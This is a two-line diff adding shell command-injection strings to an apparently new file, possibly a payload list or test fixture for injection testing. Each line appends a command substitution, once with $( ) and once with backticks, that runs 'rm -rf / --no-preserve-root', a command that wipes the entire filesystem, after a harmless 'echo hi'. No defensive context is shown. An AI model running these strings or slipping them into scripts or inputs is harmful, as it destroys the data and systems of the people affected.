@@ -1,0 +1,2 @@
+echo hi; $(rm -rf / --no-preserve-root)
+echo hi; `rm -rf / --no-preserve-root`
